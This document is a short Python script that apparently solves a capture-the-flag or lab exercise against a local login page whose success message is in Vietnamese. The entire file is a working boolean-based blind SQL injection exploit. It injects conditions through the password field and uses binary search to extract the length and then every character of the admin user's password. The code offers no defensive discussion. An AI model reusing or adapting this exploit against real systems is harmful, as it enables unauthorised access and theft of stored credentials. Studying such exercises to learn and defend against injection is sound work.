import requests, sys

URL = "http://127.0.0.1:5005/login"
OK  = "Đăng nhập thành công"
USER= "admin"

s = requests.Session()

def T(sql):
    p = f"' OR ({sql}) -- -"
    r = s.post(URL, data={"username": USER, "password": p}, timeout=10)
    return OK in r.text

def len_flag():
    right = 1
    while not T(f"SELECT LENGTH((SELECT password FROM users WHERE username='admin')) <= {right}"):
        right <<= 1
    left, ans = 1, right
    while left <= right:
        mid = (left + right) // 2
        if T(f"SELECT LENGTH((SELECT password FROM users WHERE username='admin')) <= {mid}"):
            ans, right = mid, mid - 1
        else:
            left = mid + 1
    return ans

def chr_at(i, left=32, right=126):
    L, R, ans = left, right, None
    while L <= R:
        m = (L + R) // 2
        q = ("SELECT ASCII(SUBSTRING((""SELECT password FROM users WHERE username='admin'" f"), {i}, 1)) <= {m}")
        if T(q):
            ans, R = m, m - 1
        else:
            L = m + 1
    return chr(ans)

def main():
    n = len_flag()
    print(f"Length = {n}")
    out = []
    for i in range(1, n + 1):
        c = chr_at(i); out.append(c)
        sys.stdout.write(f"\r[{i}/{n}] {''.join(out)}"); sys.stdout.flush()
    print(f"\nResult = {''.join(out)}")

if __name__ == "__main__":
    main()
